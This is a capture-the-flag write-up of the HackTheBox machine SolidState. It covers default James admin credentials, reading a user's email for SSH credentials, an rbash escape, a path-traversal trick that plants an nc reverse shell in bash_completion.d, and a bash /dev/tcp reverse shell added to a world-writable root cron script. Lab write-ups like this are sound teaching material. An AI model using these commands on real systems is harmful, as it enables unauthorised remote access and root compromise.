# SolidState -- HackTheBox (write-up)

**Difficulty:** Medium
**Box:** SolidState (HackTheBox)
**Author:** dkrxhn
**Date:** 2025-06-18

---

## TL;DR

### Default creds on James mail server admin. Reset a user's password, read their email for SSH creds. Restricted bash escaped with `ssh -t bash`. Privesc via world-writable cron script running as root.
---

## Target info

- Host: `10.129.226.162`
- Services discovered: `22/tcp (ssh)`, `25/tcp (smtp)`, `80/tcp (http)`, `110/tcp (pop3)`, `119/tcp (nntp)`, `4555/tcp (james-admin)`

---

## Enumeration

![Nmap results](images/solidstate-htb_1.png)

![Nmap continued](images/solidstate-htb_2.png)

![Web page](images/solidstate-htb_3.png)

![More enumeration](images/solidstate-htb_4.png)

## Exploitation

Connected to James admin on port 4555 with default creds `root:root`:

![James admin](images/solidstate-htb_5.png)

![James admin connected](images/solidstate-htb_6.png)

![Users listed](images/solidstate-htb_7.png)

![User enum](images/solidstate-htb_8.png)

Reset box (previous user data present), then set mindy's password:

![Reset password](images/solidstate-htb_9.png)

Connected to POP3 and read mindy's emails with `RETR`:

![POP3 login](images/solidstate-htb_10.png)

```
RETR 1
```

![Email 1](images/solidstate-htb_11.png)

```
RETR 2
```

![Email 2](images/solidstate-htb_12.png)

SSH creds found: `mindy:P@55W0rd1!2@`

## User

![SSH login](images/solidstate-htb_13.png)

- Landed in `rbash` (restricted bash)

Escaped rbash:

```bash
ssh mindy@10.129.226.162 -t bash
```

![rbash escape](images/solidstate-htb_14.png)

### Alternative path -- James exploit via bash_completion.d

The James mail server has a path traversal vulnerability -- usernames aren't sanitized, so creating a user like `../../../../etc/bash_completion.d` drops email content as a script that runs on any user login:

![Exploit explained](images/solidstate-htb_15.png)

![Created user](images/solidstate-htb_16.png)

Sent email with reverse shell payload via SMTP:

![Sending email](images/solidstate-htb_17.png)

Commands:

```
EHLO 0xdf
MAIL FROM: <0xdf@10.10.14.133>
RCPT TO: <../../../../../../../../etc/bash_completion.d>
DATA
FROM: 0xdf@10.10.14.133

/bin/nc -e /bin/bash 10.10.14.133 443
.
quit
```

Started listener, triggered via SSH login as mindy:

![SSH trigger](images/solidstate-htb_18.png)

![Shell caught](images/solidstate-htb_19.png)

## Privilege escalation

Found world-writable script in `/opt`:

![World writable script](images/solidstate-htb_20.png)

Uploaded pspy to `/dev/shm`:

![pspy upload](images/solidstate-htb_21.png)

```bash
chmod +x pspy64
./pspy64
```

![pspy running](images/solidstate-htb_22.png)

![Cron found](images/solidstate-htb_23.png)

- `/opt/tmp.py` runs every 3 minutes as root (UID=0)

Edited the script to add a reverse shell:

```python
os.system('bash -c "bash -i >& /dev/tcp/10.10.14.133/443 0>&1"')
```

![Edited script](images/solidstate-htb_24.png)

Waited for cron to trigger:

![Root shell](images/solidstate-htb_25.png)

---

## Lessons & takeaways

- Default creds on James admin (`root:root`) -- reset user passwords to read emails
- Escape rbash with `ssh -t bash`
- World-writable scripts in cron are easy root -- use pspy to find them
- James mail server path traversal can drop payloads into bash_completion.d
---
